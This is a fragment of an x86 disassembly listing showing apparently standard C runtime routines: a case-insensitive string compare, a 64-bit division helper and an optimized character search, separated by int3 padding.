  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
